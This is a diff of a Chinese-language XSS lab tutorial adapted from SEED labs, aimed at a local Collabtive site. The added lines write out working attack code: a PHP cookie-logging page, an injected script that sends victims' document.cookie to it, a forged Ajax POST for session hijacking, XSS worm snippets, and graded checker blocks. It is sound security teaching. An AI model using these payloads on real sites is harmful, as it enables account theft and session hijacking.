@@ -20,7 +20,7 @@ enable_checker: true
 
 ### 1、什么是XSS 
 
-XSS(Cross Site Scripting)：跨站脚本攻击，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的；而在xss攻击中，恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。
+XSS(Cross Site Scripting)：跨站脚本攻击，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的；而在xss攻击中，恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。
 
 ### 2、XSS分类 
 
@@ -55,25 +55,30 @@ XSS(Cross Site Scripting)：跨站脚本攻击，它与SQL注入攻击类似，S
 配置DNS：
 
 ```
-    sudo vim /etc/hosts
+sudo vim /etc/hosts
 ```
 
-![2.5-1](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156281821?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![2.5-1](https://doc.shiyanlou.com/document-uid600404labid882timestamp1524795675879.png/wm)
 
 配置网站文件：
 
 ```
-    sudo vim /etc/apache2/conf.d/lab.conf
+sudo vim /etc/apache2/conf.d/lab.conf
 ```
+代码内容如下：
 
-![2.5-2](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156311564?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
-
+```
+<VirtualHost *>
+ServerName http://www.xsslabcollabtive.com
+DocumentRoot /var/www/XSS/Collabtive/
+</VirtualHost>
+```
 
 启动服务：
 
 ```
-    sudo service apache2 start
-    sudo mysqld_safe
+sudo service apache2 start
+sudo mysqld_safe
 ```
 访问测试
 
@@ -110,39 +115,52 @@ XSS(Cross Site Scripting)：跨站脚本攻击，它与SQL注入攻击类似，S
 
 搭建好环境就开始进入到正式的实验步骤。
 
-### lab1 通过弹窗显示恶意信息 
+### 1、通过弹窗显示恶意信息 
 
-step1：新建一个js.html文件，获取弹框；弹框的目的是为了验证是否存在xss漏洞；
+#### 1.1 新建一个 `js.html` 文件，获取弹框
+
+弹框的目的是为了验证是否存在xss漏洞：
 
 ```
-    cd /var/www/XSS/Collabtive/
-    sudo vim js.html
+cd /var/www/XSS/Collabtive/
+sudo vim js.html
 ```
-
-![3.1-1](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156723850?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+代码内容如下：
+```
+<script>
+alert('xss');
+</script>
+```
 
 访问测试：
 
-![3.1-2](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156736097?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.1-1](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156736097?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 
-step2：通过html调用js来获取弹框；这么做是为了有的时候，受害网站不允许直接写js代码，这个时候我们可以通过调用来检验是否存在xss漏洞
-新建myscript.js文件：
+#### 1.2 通过html调用js来获取弹框
+
+这么做是为了有的时候，受害网站不允许直接写js代码，这个时候我们可以通过调用js来检验是否存在xss漏洞.
+
+新建 `myscript.js` 文件：
 
 ```
-    sudo vim myscript.js
+sudo vim myscript.js
 ```
 
-![3.1-3](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156755204?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+代码内容如下：
+
+```
+alert('xss');
+```
 
 这里要说明一下，当我们调用js文件的时候，js文件中不需要写`<script></script>`标签；
 
-新建include.html文件，调用js，验证xss漏洞是否存在：
+新建 `include.html` 文件，调用js，验证xss漏洞是否存在：
 
 ```
-    sudo vim include.html
+sudo vim include.html
 ```
-`include.html` 的内容如下。
+`include.html` 的内容如下:
 ```
 <script type="text/javascript" src="http://www.xsslabcollabtive.com/myscript.js">
 </script>
@@ -150,7 +168,7 @@ step2：通过html调用js来获取弹框；这么做是为了有的时候，受
 
 访问测试：
 
-![3.1-4](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156782625?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.1-2](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156782625?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 ```checker
 - name: check js.html
@@ -176,21 +194,21 @@ step2：通过html调用js来获取弹框；这么做是为了有的时候，受
   error: include.html不存在或者文件内容不对
 ```
 
-### lab2 恶意显示Cookie 
+### 2、恶意显示cookie 
 
 弹框仅仅是为了验证是否存在xss漏洞，并没有什么利用价值，而JavaScript中可以用函数来获取cookie，接下来就是使用JavaScript获取cookie来进一步利用；
 
-step1：在`/var/www/XSS/Collabtive/manageuser.php`文件中添加一行，用来显示Cookie。当用户去访问这个页面的时候，就会显示当前的Cookie：
+在`/var/www/XSS/Collabtive/manageuser.php`文件中添加一行，用来显示cookie。当用户去访问这个页面的时候，就会显示当前的cookie：
 
 ```
-    sudo vim manageuser.php
+sudo vim /var/www/XSS/Collabtive/manageuser.php
 ```
 
-![3.2-1](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156823580?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.2-1](https://doc.shiyanlou.com/document-uid600404labid882timestamp1524797894429.png/wm)
 
-添加的这一行的功能就是以弹窗的形式显示用户的Cookie；
+添加这一行的功能就是以弹窗的形式显示用户的cookie；
 
->效果：弹出来的就是我们当前用户的Cookie，我们可以使用livehttpheaders来抓取验证；
+>效果：使用用户名：admin 密码： admin登录网站，弹出来的就是我们当前用户的cookie
 
 ![3.2-2](https://dn-simplecloud.shiyanlou.com/uid/8797/1524644925807.png-wm)
 
@@ -198,37 +216,52 @@ step1：在`/var/www/XSS/Collabtive/manageuser.php`文件中添加一行，用�
 - name: check manageuser.php content
   script: |
     #!/bin/bash
-    grep "document.cookie" manageuser.php
+    grep "document.cookie" /var/www/XSS/Collabtive/manageuser.php
   error: manageuser.php 配置不对
 ```
 
-### lab3 窃取受害者的Cookie 
+### 3、窃取受害者的cookie 
 
-lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cookie，我们需要在不登陆的情况下，获取其他用户的Cookie，这样我们就可以使用cookie直接登录别人的账号；
+上一个实验的情况局限于获取自己的cookie，当然我们不需要自己的cookie，我们需要在不登陆的情况下，获取其他用户的cookie，这样我们就可以使用cookie直接登录别人的账号；
 
 首先构造我们的攻击页面hack.php：
 
 ```
-    sudo vim hack.php
+sudo vim hack.php
 ```
-![3.3-1](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429156942831?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+代码如下：
 
+```
+<?php
+$cookie = $_GET['c'];
+$log = fopen("cookie.txt","a");
+fwrite($log,$cookie ."\n");
+fclose($log);
+?>
+```
 
 上面是获取cookie的代码，同时我们需要一个文件来接受cookie；在与hack.php文件同目录下新建一个cookie.txt用来接收cookie值；而且这个文件需要有写入权限；
+```
+shiyanlou@5a2e74121d80:/var/www/XSS/Collabtive$ touch cookie.txt
+shiyanlou@5a2e74121d80:/var/www/XSS/Collabtive$ sudo chmod 777 cookie.txt
+```
 
-![3.3-2](https://dn-simplecloud.shiyanlou.com/uid/8797/1524644416708.png-wm)
+然后我们在 `manageuser.php` 页面新增这样的语句，当用户访问这个页面时，用户就会把cookie发送到攻击者的手里：
 
-然后我们在manageuser.php页面新增这样的语句，当用户访问这个页面时，用户就会把cookie发送到我们攻击者的手里：
+![3.3-1](https://doc.shiyanlou.com/document-uid600404labid882timestamp1524800674629.png/wm)
 
-![3.3-3](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159671189?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+代码内容如下：
+```
+echo "<script>document.write('<img src=http://www.xsslabcollabtive.com/hack.php?c=' + escape(document.cookie) + '>');</script>";
+```
 
-受害者访问www.xsslabcollabtive.com/manageuser.php页面：
+受害者访问 www.xsslabcollabtive.com/manageuser.php 页面：
 
-![3.3-4](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159692468?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.3-2](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159692468?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 这个时候，攻击者在cookie.txt文件里面就获取了受害者的Cookie：
 
-![3.3-5](https://dn-simplecloud.shiyanlou.com/uid/8797/1524644817511.png-wm)
+![3.3-3](https://doc.shiyanlou.com/document-uid600404labid882timestamp1524810266173.png/wm)
 
 ```checker
 - name: check hack.php
@@ -255,15 +288,15 @@ lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cook
   error: manageusr.php 配置不对
 ```
 
-### lab4 使用获取的Cookie进行会话劫持 
+### 4、使用获取的cookie进行会话劫持 
 
-当获取了受害者的Cookie以后，我们可以干嘛呢？可以利用Cookie登录用户，也就是会话劫持；
+当获取了受害者的cookie以后，我们可以干嘛呢？可以利用cookie登录用户，也就是会话劫持；
 
 >会话劫持：窃取受害者的cookie后,攻击者可以仿造受害者向服务器发送请求,包括代表受害者创建一个新项目,发帖子,删除等等。从本质上讲, 就是劫持受害者的会话。
 
-首先：我们查看受害者创建项目时候的请求：
+首先,我们查看受害者创建项目时候的请求：
 
-这里使用的工具是之前提到的 `live http headers` 工具，点击浏览器的 tools-》add-ones ，在搜索框输入 live http header 就可以找到，点击 install 即可安装，安装后重启浏览器就可以了。我这里是已经安装了，截图如下：
+这里使用的工具是之前提到的 `live http headers` 工具，点击浏览器的 tools-》add-ons ，在搜索框输入 live http header 就可以找到，点击 install 即可安装，安装后重启浏览器就可以了。我这里是已经安装了，截图如下：
 
 ![3.4-1](https://dn-simplecloud.shiyanlou.com/uid/8797/1524647286699.png-wm)
 
@@ -271,7 +304,7 @@ lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cook
 
 ![3.4-2](https://dn-simplecloud.shiyanlou.com/uid/8797/1524647662626.png-wm)
 
-然后点击浏览器 tools-》 live http headers，打开之前添加的工具。再输入 www.xsslabcollabtive.com 访问并登录。就可以在 live http headers 的窗口看到很多类似如下的内容。当然，你的显示内容跟我的有些地方可能不一样。
+然后点击浏览器 tools-》 live http headers，打开之前添加的工具。再输入 www.xsslabcollabtive.com 访问并登录。就可以在 live http headers 的窗口看到很多类似如下的内容。当然，你显示的内容跟我的有些地方可能不一样。
 
 ![3.4-3](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159724192?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
@@ -356,85 +389,83 @@ lab2的情况局限于获取自己的Cookie，当然我们不需要自己的Cook
 > - 使用 javac HTTPSimpleForge.java 编译文件
 > - 使用 java HTTPSimpleForge 运行程序
 
-### lab5 XSS蠕虫 
+### 5、XSS蠕虫 
 
 #### xss蠕虫 cross site scripting worm 
 
-是一种跨站脚本病毒， 通常由脚本语言Javascript写成， 它借由网站访问者传播。由于XSS蠕虫基于浏览器而不是操作系统, 取决于其依赖网站的规模, 它可以在短时间内达到对巨大数量的计算机感染；
+是一种跨站脚本病毒， 通常由脚本语言Javascript写成， 它借由网站访问者传播。由于XSS蠕虫基于浏览器而不是操作系统, 取决于其依赖网站的规模, 它可以在短时间内对巨大数量的计算机进行感染；
 
 #### XSS蠕虫的危害 
 
-蠕虫可以用来打广告、刷流量、挂马、恶作剧、破坏网上数据、实施DDoS攻击等等等。
+蠕虫可以用来打广告、刷流量、挂马、恶作剧、破坏网上数据、实施DDoS攻击等等。
 
 #### XSS蠕虫的学习 
 
-首先我么需要理解一下Ajax框架。框架代码如下：
+首先我们需要理解一下Ajax框架，框架代码如下：
 
 ```
-    var Ajax=null;
-    // 构建http请求的头信息
-    Ajax=new XMLHttpRequest();
-    Ajax.open("POST","http://www.xsslabcollabtive.com/manageuser.php?action=edit",true);
-    Ajax.setRequestHeader("Host","www.xsslabcollabtive.com");
-    Ajax.setRequestHeader("Keep-Alive","300");
-    Ajax.setRequestHeader("Connection","keep-alive");
-    Ajax.setRequestHeader("Cookie",document.cookie);
-    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-    // 构建http请求内容。 内容的格式可以从浏览器插件LiveHTTPHeaders中知道长什么样
-    var content="name=...&company=&..."; // 这是你需要填写的内容
-    // 发送http POST请求。
-    Ajax.send(content);
+var Ajax=null;
+// 构建http请求的头信息
+Ajax=new XMLHttpRequest();
+Ajax.open("POST","http://www.xsslabcollabtive.com/manageuser.php?action=edit",true);
+Ajax.setRequestHeader("Host","www.xsslabcollabtive.com");
+Ajax.setRequestHeader("Keep-Alive","300");
+Ajax.setRequestHeader("Connection","keep-alive");
+Ajax.setRequestHeader("Cookie",document.cookie);
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+// 构建http请求内容。 内容的格式可以从浏览器插件LiveHTTPHeaders中知道长什么样
+var content="name=...&company=&..."; // 这是你需要填写的内容
+// 发送http POST请求。
+Ajax.send(content);
 ```
 
 我们有一个test.js的文件；这个文件中是Ajax框架代码，我们可以使用下面的命令查看一下：
 
 ```
-    sudo vim test.js
+sudo vim test.js
 ```
 
-![3.5-1](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159744204?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.5-1](https://doc.shiyanlou.com/document-uid600404labid882timestamp1524811043155.png/wm)
 
-然后我们在创建一个test1.js的文件，写一个xss蠕虫代码：
-
-```
-    sudo vim test1.js
-```
-
-![3.5-2](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159761760?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
-
-这里是代码：
+然后我们再创建一个test1.js的文件，写一个xss蠕虫代码：
 
 ```
-    var on=new Ajax.PeriodicalUpdater("onlinelist",
-    "manageuser.php?action=onlinelist",
-    //定义一个新的Ajax.PeriodicalUpdater
-    {method:'get',onSuccess:function(transport){alert(transport.responseText);},
-    frequence:1000}
-    //请求方式为get，频率为1000
+sudo vim test1.js
 ```
 
-上面的蠕虫代码不能够进行自动传播，这样达不到我们的需求；我们需要编写一个可以自动传播的xss蠕虫病毒的脚本，下面这段代码是蠕虫可以自动传播：
+代码如下：
 
 ```
-    <script id=worm>//定义js的id为worm
-    var strCode = document.getElementById("worm");
-    //找到元素id
-	alert(strCode.innerHTML);
-    </script>
+var on=new Ajax.PeriodicalUpdater("onlinelist",
+"manageuser.php?action=onlinelist",
+//定义一个新的Ajax.PeriodicalUpdater
+{method:'get',onSuccess:function(transport){alert(transport.responseText);},
+frequence:1000}
+//请求方式为get，频率为1000
+```
+
+上面的蠕虫代码不能够进行自动传播，这样达不到我们的需求；我们需要编写一个可以自动传播的xss蠕虫病毒的脚本，下面这段代码可以使蠕虫自动传播：
+
+```
+<script id=worm>//定义js的id为worm
+var strCode = document.getElementById("worm");
+//找到元素id
+alert(strCode.innerHTML);
+</script>
 ```
 
 代码中使用循环体，从而达到自动传播的目的，具体操作如下：
 
-在实验机中这样创建xss蠕虫：
+在环境中这样创建xss蠕虫：
 
 ```
 sudo vim xss_worm.js
 ```
 
-
+代码如下：
 ```
-    var strCode = document.getElementById("worm");
-	alert(strCode.innerHTML);
+var strCode = document.getElementById("worm");
+alert(strCode.innerHTML);
 ```
 
 然后用一个html文件调用蠕虫：
@@ -442,20 +473,11 @@ sudo vim xss_worm.js
 ```
 sudo vim worm.html
 ```
-
-![3.5-3](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159819243?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
-
+代码如下：
 ```
-    <script type='text/javascript' src='http://www.xsslabcollabtive.com/xss_worm.js'></script>
+<script type='text/javascript' src='http://www.xsslabcollabtive.com/xss_worm.js'></script>
 ```
 
-#### 科普 
-
->XSS worm攻击原理剖析[http://book.51cto.com/art/201311/419361.htm](http://book.51cto.com/art/201311/419361.htm "XSS worm攻击原理剖析")
-
->XSS worm剖析 [http://book.51cto.com/art/201311/419362.htm](http://book.51cto.com/art/201311/419362.htm "XSS Worm剖析")
-
->XSS worm案例 [http://www.wooyun.org/bugs/wooyun-2013-017701](http://www.wooyun.org/bugs/wooyun-2013-017701 "点评网主站漏洞打包详解+手把手教你写xss蠕虫")
 
 ```checker
 - name: check test1.js
@@ -481,7 +503,7 @@ sudo vim worm.html
   error: worm.html 不存在或者文件内容不对
 ```
 
-### lab6 XSS防御 
+### 6、XSS防御 
 
 简易代码防御xss漏洞：
 
@@ -489,29 +511,40 @@ sudo vim worm.html
 sudo vim /var/www/XSS/Collabtive/include/initfunctions.php
 ```
 定位到第 `170` 行的 getArrayVal 方法。
-![![img](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159842818?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)3.6-1](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159831667?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
-![3.6-2](https://dn-anything-about-doc.qbox.me/userid9094labid882time1429159842818?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![3.6-1](https://doc.shiyanlou.com/document-uid600404labid882timestamp1524812123503.png/wm)
+
+把上图代码修改为下图所示：
+
+![3.6-2](https://doc.shiyanlou.com/document-uid600404labid882timestamp1524812144247.png/wm)
 
 
 **为什么**
 
-首先你需要了解`strip_only_tags()`这个函数：`strip_only_tags()`([科普](http://www.w3school.com.cn/php/func_string_strip_tags.asp))这个函数它让攻击者输入的html标记语言都消失了当然就不能受到直接攻击了。但是这样子是完全不能够防御聪明的黑客的，他可以通过字符构造来达到攻击的目的。如何更好的防御xss攻击，请参考科普里面的几篇文献。
+首先你需要了解`strip_only_tags()`这个函数：`strip_only_tags()`([科普](http://www.w3school.com.cn/php/func_string_strip_tags.asp))这个函数它让攻击者输入的html标记语言都消失了，当然就不能受到直接攻击了。但是这样子是完全不能够防御聪明的黑客的，他可以通过字符构造来达到攻击的目的。
 
-### 科普 
+如何更好的防御xss攻击，请参考科普里面的几篇文献。
+
+#### 科普 
+
+>XSS worm攻击原理剖析[http://book.51cto.com/art/201311/419361.htm](http://book.51cto.com/art/201311/419361.htm "XSS worm攻击原理剖析")
+
+>XSS worm剖析 [http://book.51cto.com/art/201311/419362.htm](http://book.51cto.com/art/201311/419362.htm "XSS Worm剖析")
+
+>XSS worm案例 [http://www.wooyun.org/bugs/wooyun-2013-017701](http://www.wooyun.org/bugs/wooyun-2013-017701 "点评网主站漏洞打包详解+手把手教你写xss蠕虫")
+
+### 7、科普 
 
 如果你想更多的了解相关的XSS知识,可以去阅读**《XSS跨站脚本攻击剖析与防御》**。
 
-## 作业 
-你需要提交一份详细的实验报告，描述你所做的和你所观察到的。
-
-使用的LiveHTTPHeaders或Wireshark的截图。
+## 四、作业 
+你需要提交一份详细的实验报告，描述你所做的和你所观察到的，以及使用的LiveHTTPHeaders或Wireshark的截图。
 
 您还可以提供有趣的或者令人惊讶的观察。
 
 ## license 
 
-本实验所涉及的实验环境来自[Syracuse SEED labs](http://www.cis.syr.edu/~wedu/seed/)，并在此基础上为适配实验室我那工作环境进行修改，修改后的实验文档仍然遵循GUN Free Documentation License
+本实验所涉及的实验环境来自[Syracuse SEED labs](http://www.cis.syr.edu/~wedu/seed/)，并在此基础上为适配实验室的工作环境进行修改，修改后的实验文档仍然遵循GUN Free Documentation License
 附[Syracuse SEED labs](http://www.cis.syr.edu/~wedu/seed/)版权说明：
 
 Copyright 
